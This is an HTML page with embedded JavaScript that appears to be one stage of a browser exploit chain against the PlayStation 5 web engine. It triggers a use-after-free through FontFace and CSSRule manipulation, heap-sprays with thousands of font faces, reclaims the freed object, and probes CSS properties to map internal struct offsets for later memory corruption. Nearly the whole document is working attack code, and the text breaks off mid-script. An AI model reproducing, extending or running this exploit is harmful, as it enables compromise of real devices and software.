<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v43 — Struct Field Mapper</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
pointer-events:none;z-index:9999}
#hd{position:fixed;top:0;left:0;right:0;height:44px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #00ff41;display:flex;align-items:center;
padding:0 16px;gap:14px;z-index:10;font-size:12px}
.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
#out{position:fixed;top:46px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#001a06}
#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
</style>
</head>
<body>
<div id="hd">
<span class="l">▶ v43 MAPPER</span><span class="s">│</span>
<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
<span class="v" id="h2">STAGE:<b>INIT</b></span>
</div>
<div id="pg"><div id="bar" style="width:0%"></div></div>
<div id="out"></div>
<script>
"use strict";

// ============================================================
//  PS5 v43 — Struct Field Mapper
//  Built on v42 UAF + CSSRule Spray
//  Probes every CSS-accessible field to map struct layout
//  and determine distance to m_wrapper (0x80)
// ============================================================

var O=document.getElementById("out");
var bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}

window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true;};

var ua=navigator.userAgent||"";
var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

P("════════════════════════════════════","hd");
P("  v43 — Struct Field Mapper","hd");
P("════════════════════════════════════","hd");
P("");

var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

var sh=document.getElementById("s").sheet;
var keep=[],holes=[],trigger=null,uafOk=false;

// ============================================================
//  PHASE 1: UAF + CSSRule Spray (from v42)
// ============================================================

pg(5);Hd("Creating holes...");
for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
fs();Ok("Holes ready: "+holes.length);

pg(10);Hd("Trigger setup...");
trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(trigger);void trigger.loaded;
for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
fs();
var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
var fsh=fst.sheet;
for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
fs();Ok("Trigger ready");

pg(15);Hd("UAF + CSSRule Spray (A_0..A_2048)");

Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","STAGE:<b>UAF</b>");
St("UAF WINDOW OPEN");
try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
fs()}catch(e){}
Dm("GC pressure (16MB)...");
for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
Dm("Spraying 2048 A_ faces...");
for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}
fs();
try{var d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
Dm("UAF window closing");
}return undefined}});

var rn=0;var raf=function(){rn++;
if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

// ============================================================
//  PHASE 2: Identify Confused Object
// ============================================================

pg(30);Sep();Hd("PHASE 2: Identify Confused Object");Sep();

Dm("Calling load() synchronously...");

try {
  var loadPromise = document.fonts.load("1em trigger, x", "AB");
  
  loadPromise.then(function(faces){
    P("  load() returned "+faces.length+" faces");
    P("");
    
    var aFamily = null;
    var aFace = null;
    
    for(var i=0;i<faces.length;i++){
      var f=faces[i];
      P("  Face["+i+"]: family="+f.family+" weight="+f.weight);
      if(f.family&&f.family.indexOf("A_")===0){
        aFamily = f.family;
        aFace = f;
      }
    }
    
    if(!aFamily){
      Fl("No A_ face found — spray failed");
      hu("h2","STAGE:<b>FAIL</b>");
      return;
    }
    
    St("RECLAIMED: "+aFamily);
    keep.push(faces);
    
    // Find A_NNN's CSSRule index
    var aIndex = -1;
    var aNum = parseInt(aFamily.split("_")[1]);
    P("");
    Dm("Scanning CSSRules for "+aFamily+"...");
    for(var i=0;i<sh.cssRules.length;i++){
      try {
        var r = sh.cssRules[i];
        if(r.type === 5) { // CSSFontFaceRule
          var rf = r.style.getPropertyValue("font-family");
          if(rf && rf.indexOf(aFamily) !== -1) {
            aIndex = i;
            break;
          }
        }
      } catch(e) {}
    }
    
    if(aIndex === -1){
      Fl("Could not find CSSRule for "+aFamily);
      return;
    }
    
    Ok("Found CSSRule at index "+aIndex);
    var aRule = sh.cssRules[aIndex];
    var aStyle = aRule.style;
    
    // Also find the xRule
    var xIndex = -1;
    for(var i=0;i<sh.cssRules.length;i++){
      try {
        var r = sh.cssRules[i];
        if(r.type === 5) {
          var rf = r.style.getPropertyValue("font-family");
          if(rf && rf.trim() === "x") {
            xIndex = i;
            break;
          }
        }
      } catch(e) {}
    }
    
    if(xIndex === -1){
      Wr("xRule not found — re-inserting");
      sh.insertRule("@font-face{font-family:x;src:local(Courier);unicode-range:U+0042}",sh.cssRules.length);
      xIndex = sh.cssRules.length - 1;
    }
    
    var xRule = sh.cssRules[xIndex];
    var xStyle = xRule.style;
    Ok("xRule at index "+xIndex);
    
    // ============================================================
    //  PHASE 3: Struct Field Mapper
    // ============================================================
    
    pg(50);Sep();Hd("PHASE 3: Struct Field Mapper");Sep();
    P("  Probing every CSS-accessible field...","dm");
    P("  Writing to A_"+aNum+"'s CSSRule, reading via confused x selector","dm");
    P("");
    
    var results = [];
    var confirmedCount = 0;
    var failedCount = 0;
    
    // Probe runner
    function runProbe(name, writeVal, readFn, expectedOff, desc, type) {
      var key = name+'="'+writeVal+'"';
      P("  ["+expectedOff+"] "+key+" ("+desc+")","dm");
      
      try {
        // WRITE to A_NNN's CSSRule
        aStyle.setProperty(name, writeVal);
        
        // READ via confused selector path
        var readFaces = document.fonts.load("1em trigger, x", "AB");
        var readVals = readFn(readFaces);
        var cssVal = aStyle.getPropertyValue(name);
        
        // Check if write propagated
        var readStr = JSON.stringify(readVals);
        var writeStr = String(writeVal);
        var propagated = false;
        
        if(type === "numeric") {
          // For numeric, check if the number appears in readback
          for(var i=0;i<readVals.length;i++){
            if(readVals[i] !== null && readVals[i] !== undefined) {
              if(String(readVals[i]) === writeStr || 
                 String(readVals[i]).indexOf(writeStr) !== -1) {
                propagated = true;
                break;
              }
            }
          }
        } else if(type === "float") {
          for(var i=0;i<readVals.length;i++){
            if(readVals[i] !== null && readVals[i] !== undefined) {
              var fv = parseFloat(readVals[i]);
              var wv = parseFloat(writeVal);
              if(!isNaN(fv) && !isNaN(wv) && Math.abs(fv - wv) < 0.01) {
                propagated = true;
                break;
              }
            }
          }
        } else {
          propagated = readStr.indexOf(writeStr) !== -1;
        }
        
        if(propagated) {
          Ok("    READ: "+readStr+" ✓");
          results.push({name:key, off:expectedOff, desc:desc, type:type,
            write:writeVal, read:readStr, css:cssVal, ok:true});
          confirmedCount++;
        } else {
          Fl("    READ: "+readStr+" ✗ (no match)");
          results.push({name:key, off:expectedOff, desc:desc, type:type,
            write:writeVal, read:readStr, css:cssVal, ok:false});
          failedCount++;
        }
        
        // Clean up
        try { aStyle.removeProperty(name); } catch(e) {}
        
      } catch(e) {
        Fl("    ERR: "+e.message);
        results.push({name:key, off:expectedOff, desc:desc, type:type,
          write:writeVal, error:e.message, ok:false});
        failedCount++;
      }
      P("");
    }
    
    // --- m_family (0x20) ---
    Hd("Offset 0x20: m_family");
    runProbe("font-family", "testFamProbe", 
      function(faces){return faces.map(function(f){return f.family})},
      "0x20", "m_family (RefPtr<CSSValue>)", "string");
    
    // --- m_ranges (0x28) ---
    Hd("Offset 0x28: m_ranges");
    runProbe("unicode-range", "U+0000-007F",
      function(faces){return faces.map(function(f){return f.unicodeRange})},
      "0x28", "m_ranges (Vector<UnicodeRange>)", "string");
    
    // --- m_featureSettings (0x40) ---
    Hd("Offset 0x40: m_featureSettings");
    runProbe("font-feature-settings", "\"test\" 1",
      function(faces){return faces.map(function(f){
        try{return f.featureSettings}catch(e){return "ERR:"+e.message}})},
      "0x40", "m_featureSettings", "string");
    
    // --- m_loadingBehavior (0x58) ---
    Hd("Offset 0x58: m_loadingBehavior");
    runProbe("font-display", "block",
      function(faces){return faces.map(function(f){
        try{return f.display}catch(e){return "ERR:"+e.message}})},
      "0x58", "m_loadingBehavior (block)", "enum");
    runProbe("font-display", "swap",
      function(faces){return faces.map(function(f){
        try{return f.display}catch(e){return "ERR:"+e.message}})},
      "0x58", "m_loadingBehavior (swap)", "enum");
    runProbe("font-display", "fallback",
      function(faces){return faces.map(function(f){
        try{return f.display}catch(e){return "ERR:"+e.message}})},
      "0x58", "m_loadingBehavior (fallback)", "enum");
    runProbe("font-display", "optional",
      function(faces){return faces.map(function(f){
        try{return f.display}catch(e){return "ERR:"+e.message}})},
      "0x58", "m_loadingBehavior (optional)", "enum");
    
    // --- m_sizeAdjust (0x5C) — FLOAT ---
    Hd("Offset 0x5C: m_sizeAdjust (FLOAT)");
    runProbe("size-adjust", "50",
      function(faces){return faces.map(function(f){
        try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}})},
      "0x5C", "m_sizeAdjust (50.0)", "float");
    runProbe("size-adjust", "73.5",
      function(faces){return faces.map(function(f){
        try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}})},
      "0x5C", "m_sizeAdjust (73.5)", "float");
    runProbe("size-adjust", "200",
      function(faces){return faces.map(function(f){
        try{return f.sizeAdjust}catch(e){return "ERR:"+e.message}})},
      "0x5C", "m_sizeAdjust (200.0)", "float");
    
    // --- m_fontSelectionCapabilities.weight (0x88) ---
    Hd("Offset 0x88: weight (9-value sweep)");
    var weights = [100,200,300,400,500,600,700,800,900];
    for(var wi=0; wi<weights.length; wi++) {
      var wv = String(weights[wi]);
      runProbe("font-weight", wv,
        function(faces){return faces.map(function(f){return f.weight})},
        "0x88", "weight ("+wv+")", "numeric");
    }
    
    // --- m_fontSelectionCapabilities.width ---
    Hd("Offset 0x88+?: width");
    runProbe("font-stretch", "condensed",
      function(faces){return faces.map(function(f){
        try{return f.stretch}catch(e){return "ERR:"+e.message}})},
      "0x88+4", "width (condensed)", "string");
    runProbe("font-stretch", "expanded",
      function(faces){return faces.map(function(f){
        try{return f.stretch}catch(e){return "ERR:"+e.message}})},
      "0x88+4", "width (expanded)", "string");
    
    // --- m_fontSelectionCapabilities.slope ---
    Hd("Offset 0x88+?: slope");
    runProbe("font-style", "italic",
      function(faces){return faces.map(function(f){
        try{return f.style}catch(e){return "ERR:"+e.message}})},
      "0x88+8", "slope (italic)", "string");
    runProbe("font-style", "oblique 20deg",
      function(faces){return faces.map(function(f){
        try{return f.style}catch(e){return "ERR:"+e.message}})},
      "0x88+8", "slope (oblique 20deg)", "string");
    
    // --- Additional probes ---
    Hd("Additional fields");
    runProbe("font-variation-settings", "\"wght\" 400",
      function(faces){return faces.map(function(f){
        try{return f.variationSettings}catch(e){return "ERR:"+e.message}})},
      "unknown", "variationSettings", "string");
    runProbe("ascent-override", "90%",
      function(faces){return faces.map(function(f){
        try{return f.ascentOverride}catch(e){return "ERR:"+e.message}})},
      "unknown", "ascentOverride", "string");
    runProbe("descent-override", "110%",
      function(faces){return faces.map(function(f){
        try{return f.descentOverride}catch(e){return "ERR:"+e.message}})},
      "unknown", "descentOverride", "string");
    runProbe("line-gap-override", "120%",
      function(faces){return faces.map(function(f){
        try{return f.lineGapOverride}catch(e){return "ERR:"+e.message}})},
      "unknown", "lineGapOverride", "string");
    
    // ============================================================
    //  PHASE 4: src Overflow Probe
    // ============================================================
    
    pg(80);Sep();Hd("PHASE 4: src Overflow Probe");Sep();
    P("  Testing if Vector manipulation bleeds into adjacent fields...","dm");
    P("");
    
    // Baseline weight
    aStyle.setProperty("font-weight", "400");
    var beforeWeight = document.fonts.load("1em trigger, x", "AB").map(function(f){return f.weight});
    P("  Baseline weight: "+JSON.stringify(beforeWeight),"dm");
    
    // Test 1: Long URL
    P("");
    Wr("Test 1: Long URL (4096 bytes) — may crash");
    try {
      var longUrl = "url('data:font/woff2;base64," + "A".repeat(4096) + "')";
      aStyle.setProperty("src", longUrl);
      var faces1 = document.fonts.load("1em trigger, x", "AB");
      Ok("  Survived. faces="+faces1.length+" weights="+JSON.stringify(faces1.map(function(f){return f.weight})));
    } catch(e) {
      Fl("  Crash: "+e.message);
    }
    
    // Test 2: Many srcs
    P("");
    Wr("Test 2: 64 comma-separated srcs — may crash");
    try {
      var manySrcs = [];
      for(var i=0; i<64; i++) {
        manySrcs.push("url('data:font/woff2;base64,"+String.fromCharCode(65+(i%26))+String(i)+"')");
      }
      aStyle.setProperty("src", manySrcs.join(", "));
      var faces2 = document.fonts.load("1em trigger, x", "AB");
      Ok("  Survived. faces="+faces2.length+" weights="+JSON.stringify(faces2.map(function(f){return f.weight})));
      
      // Check if weight changed (corruption indicator)
      var afterWeight = faces2.map(function(f){return f.weight});
      if(JSON.stringify(beforeWeight) !== JSON.stringify(afterWeight)) {
        St("WEIGHT CORRUPTED! Vector overflow bled into weight field!");
        Hi("  Before: "+JSON.stringify(beforeWeight));
        Hi("  After:  "+JSON.stringify(afterWeight));
      } else {
        Dm("  Weight unchanged — no corruption detected");
      }
    } catch(e) {
      Fl("  Crash: "+e.message);
    }
    
    // Clean up
    try { aStyle.removeProperty("src"); } catch(e) {}
    try { aStyle.removeProperty("font-weight"); } catch(e) {}
    
    // ============================================================
    //  PHASE 5: Analysis & Summary
    // ============================================================
    
    pg(100);Sep();Hd("PHASE 5: Analysis & Summary");Sep();
    P("");
    
    P("  FIELD MAP RESULTS:","hd");
    P("  ┌─────────────────────────────────────────────────────┐");
    
    var byOffset = {};
    for(var i=0; i<results.length; i++) {
      var off = results[i].off || "unknown";
      if(!byOffset[off]) byOffset[off] = [];
      byOffset[off].push(results[i]);
    }
    
    var offsets = Object.keys(byOffset).sort();
    for(var oi=0; oi<offsets.length; oi++) {
      var off = offsets[oi];
      var probes = byOffset[off];
      var anyOk = false;
      for(var pi=0; pi<probes.length; pi++) {
        if(probes[pi].ok) { anyOk = true; break; }
      }
      var mark = anyOk ? "✅" : "✘";
      var names = probes.map(function(p){return p.name.split("=")[0]}).filter(function(v,i,a){return a.indexOf(v)===i});
      P("  │ "+mark+" "+off+"  "+names.join(", "));
    }
    
    P("  └─────────────────────────────────────────────────────┘");
    P("");
    P("  Confirmed R/W channels: "+confirmedCount,"ok");
    P("  Failed probes:          "+failedCount,"er");
    P("");
    
    // Key findings
    P("  KEY FINDINGS:","hd");
    P("");
    
    // Weight check
    var weightOk = results.filter(function(r){return r.name.indexOf("font-weight")!==-1 && r.ok});
    if(weightOk.length >= 7) {
      Ok("  font-weight: "+weightOk.length+"/9 confirmed → m_fontSelectionCapabilities at 0x88 ✓");
    } else if(weightOk.length > 0) {
      Wr("  font-weight: "+weightOk.length+"/9 confirmed → partial match");
    } else {
      Fl("  font-weight: 0/9 → layout mismatch or confusion failed");
    }
    
    // sizeAdjust check
    var sizeOk = results.filter(function(r){return r.name.indexOf("size-adjust")!==-1 && r.ok});
